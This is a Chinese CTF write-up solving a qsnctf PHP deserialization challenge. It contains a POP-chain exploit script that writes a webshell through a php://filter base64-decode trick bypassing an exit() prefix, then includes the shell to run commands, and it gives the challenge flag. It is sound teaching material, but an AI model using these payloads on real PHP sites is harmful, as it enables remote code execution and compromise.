# WP · qsnctf 40793 — 反序列化 POP 链：死亡前缀写马 + php://filter 绕过

> 分类：09-PHP反序列化 ｜ 栈：nginx/1.18.0 + PHP/7.2.34 ｜ 难度：中等（POP链 + 过滤器绕过写马）
> 地址：`http://challenge.qsnctf.com:40793/`
> **Flag：`flag{1c38ed2dfa0d45f2b6b8b2db9679cbc3}`**

---

## 0. 一句话思路
`echo unserialize($_POST['data'])` → 反序列化对象被 echo → 触发 `AuditLog::__toString` → 调 `handler->process()`：
- 第一步用 **FileCache** 把 webshell 写进 `./system_config.php`，filePath 用 `php://filter/write=convert.base64-decode` 过滤器**吃掉的 `<?php exit(...); ?>` 死亡前缀**；
- 第二步用 **SystemStatus** include `system_config.php` → 执行 webshell → `?c=cat /flag` 拿 flag。

## 1. 源码要点（开卷）
```php
class AuditLog {
    public $handler;
    public function __construct() { $this->handler = new SystemStatus(); }
    public function __toString() { return $this->handler->process(); }  // 触发点：echo 对象时
}
class FileCache {
    public $filePath; public $content;
    public function process() {
        $security_header = '<?php exit("Access Denied: Protected Cache"); ?>';  // 死亡前缀
        file_put_contents($this->filePath, $security_header . $this->content);   // 落点：任意文件写
    }
}
class SystemStatus {
    public function process() {
        if(file_exists('./system_config.php')) include('./system_config.php');  // 触发点2：include 固定路径
    }
}
echo unserialize($_POST['data']);   // 入口
```
- `__construct` 反序列化时**不会**调用 → 序列化里塞的 handler 会覆盖默认的 SystemStatus。
- `echo unserialize()` 是"隐性触发"：对象被当字符串 echo → `__toString` 自动执行。

## 2. POP 链设计
```
链1（写马）: AuditLog(handler=FileCache(filePath=php://filter...system_config.php, content=AAA+base64(shell)))
   echo → __toString → FileCache::process() → 写 system_config.php（含死亡前缀，但被过滤器解码成乱码）
链2（触发）: AuditLog(handler=SystemStatus)
   echo → __toString → SystemStatus::process() → include('./system_config.php') → 执行 shell → system($_GET['c'])
```

## 3. 死亡前缀绕过：php://filter/write=convert.base64-decode ★
- 写进去的内容必然带 `<?php exit("..."); ?>` 前缀 → include 时先 exit，shell 跑不了。
- 破解：`filePath = php://filter/write=convert.base64-decode/resource=./system_config.php`
- 原理：base64 解码会**忽略所有非 base64 字符**（`<?`、引号、空格、分号等都跳过），只处理字母数字+/=。于是死亡前缀的字母部分被解码成**乱码字节**（include 时当普通文本输出），我们的 base64(shell) 正常解码成 `<?php system($_GET["c"]); ?>` 执行。
- **对齐细节（关键坑）**：前缀里的 base64 字符共 **33 个**（数：phpexit+Access+Denied+Protected+Cache=33），33 % 4 = 1，直接拼 base64 会让解码错位、污染 shell 开头几个字节。解法：**content 前面加 3 个 `A`**（33+3=36，36%4=0），错位被 AAA 吸收，shell 从干净的 4 字节边界开始解码。

## 4. 利用 payload
```python
import urllib.request, urllib.parse, base64
URL = 'http://challenge.qsnctf.com:40793/'

def post(payload, extra_get=''):
    data = urllib.parse.urlencode({'data': payload}).encode()
    return urllib.request.urlopen(urllib.request.Request(URL+extra_get, data=data), timeout=15).read().decode('utf-8','replace')

shell = '<?php system($_GET["c"]); ?>'
content = 'AAA' + base64.b64encode(shell.encode()).decode()   # 3个A对齐
fpath = 'php://filter/write=convert.base64-decode/resource=./system_config.php'
# 链1：写马（FileCache 属性要 { } 包裹，序列化串别漏括号！）
p1 = 'O:8:"AuditLog":1:{s:7:"handler";O:9:"FileCache":2:{s:8:"filePath";s:%d:"%s";s:7:"content";s:%d:"%s";}}' % (len(fpath), fpath, len(content), content)
print(post(p1)[-20:])   # 期望: Cache Saved.
# 链2：触发 include
p2 = 'O:8:"AuditLog":1:{s:7:"handler";O:12:"SystemStatus":0:{}}'
print(post(p2, '?c=' + urllib.parse.quote('cat /flag'))[-100:])  # 期望: ...flag{...}
```
（完整脚本已存 `ctf_tools/web_tools/qsnctf40793_exploit.py`）

## 5. 复盘 & 套路沉淀
1. **`echo unserialize()` = 隐性 `__toString` 触发点**：看到入口把反序列化结果 echo/拼接进字符串，立刻想到 `__toString`。
2. **POP 链三步**：找落点（危险函数：file_put_contents/system/include）→ 找触发点（`__toString`/`__destruct`）→ 反推要控制的属性。
3. **`<?php exit(); ?>` 死亡前缀写马**：`php://filter/write=convert.base64-decode` + **对齐 padding**（数清前缀 base64 字符数，补 A 到 4 的倍数）——这是写马题的万能钥匙。
4. **序列化串手写纪律**：每个对象的 `:{...}` 括号、`s:N:` 长度都要精确；漏一个 `{` 整个 unserialize 变 false（本 WP 实测踩坑）。
5. 写入的目标路径和 include 的路径要**完全一致**（`./system_config.php` 两边同写法）。
